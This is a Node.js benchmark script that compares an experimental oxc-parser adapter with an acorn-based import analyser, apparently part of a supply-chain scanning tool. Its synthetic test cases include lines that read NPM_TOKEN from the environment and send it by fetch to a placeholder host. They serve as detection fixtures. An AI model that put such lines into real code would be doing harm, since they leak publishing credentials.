'use strict';
// Experimental parser adapter only. No runtime backend or npm dependency is
// added to capsurface. Usage: node bench/oxc-parity.cjs /path/to/oxc-parser
const path=require('path');
const {pathToFileURL}=require('url');
const {isDeepStrictEqual}=require('util');
const {performance}=require('perf_hooks');
const {astImports,loadParser}=require('../lib/ast-imports');

async function main(){
  const oxc=await import(pathToFileURL(require.resolve(path.resolve(process.argv[2]))).href);
  const cases=[
    ['direct.js',"const token=process.env.NPM_TOKEN; fetch('https://service.test',{body:token});"],
    ['json.js',"const token=process.env.NPM_TOKEN; fetch('https://service.test',{body:JSON.stringify({token})});"],
    ['wrapper.js',"function send(x){fetch('https://service.test',{body:x});} send(process.env.NPM_TOKEN);"],
    ['unicode.js',"const label='😀é';\r\nfetch('https://service.test',{body:process.env.NPM_TOKEN});"],
    ['typed.ts',"const token: string=process.env.NPM_TOKEN!; fetch('https://service.test',{body:token as string});"],
    ['view.tsx',"const view=<div>{process.env.NPM_TOKEN}</div>;"],
    ['malformed.js','const ='],
    ['duplicate.js','let x; let x;'],
    ['common.cjs',"if (false) return; require('fs');"],
    ['modern.js',"using resource = acquire();"],
  ];
  function adapter(file){
    function parse(code,options){
      const result=oxc.parseSync(file,code,{sourceType:options.sourceType==='script'?'commonjs':'module',preserveParens:false,showSemanticErrors:true});
      if(result.errors.length)throw Error('parse diagnostics');
      const ast=result.program,lines=[0];
      for(let i=0;i<code.length;i++){
        if(code[i]==='\r'){if(code[i+1]==='\n')i++;lines.push(i+1);}
        else if(code[i]==='\n'||code[i]==='\u2028'||code[i]==='\u2029')lines.push(i+1);
      }
      function loc(offset){let low=0,high=lines.length;while(low+1<high){const mid=(low+high)>>1;if(lines[mid]<=offset)low=mid;else high=mid;}return {line:low+1,column:offset-lines[low]};}
      const stack=[ast];while(stack.length){const node=stack.pop();if(!node||typeof node!=='object')continue;
        if(typeof node.type==='string')node.loc={start:loc(node.start),end:loc(node.end)};
        for(const [key,item]of Object.entries(node)){if(key==='loc')continue;if(Array.isArray(item))stack.push(...item);else if(item&&typeof item==='object')stack.push(item);}
      }
      return ast;
    }
    return {parse,typed:{parse}};
  }
  const parser=loadParser();
  const results=cases.map(([file,code])=>{
    const native=adapter(file);
    const acorn=astImports(parser,code,file,'script'),rust=astImports(native,code,file,'script');
    const measure=(p)=>{const times=[];for(let i=0;i<25;i++){const t=performance.now();astImports(p,code,file,'script');times.push(performance.now()-t);}return times.sort((a,b)=>a-b)[12];};
    return {file,equal:isDeepStrictEqual(acorn,rust),acornMedianMs:measure(parser),oxcAdapterMedianMs:measure(native),
      ...(!isDeepStrictEqual(acorn,rust)?{acorn,oxc:rust}:{})};
  });
  console.log(JSON.stringify({node:process.version,oxcVersion:'0.152.0',cases:results,
    caveats:['In-process parser adapter with the existing JavaScript analysis. No isolation, packaging or Rust data-flow implementation.',
      'Ten synthetic cases, 25 timings each, one machine. Not a production acceptance benchmark.',
      'Any mismatch prevents replacing the production parser until explained and tested.']},null,2));
}
main().catch(error=>{console.error(error);process.exitCode=1;});
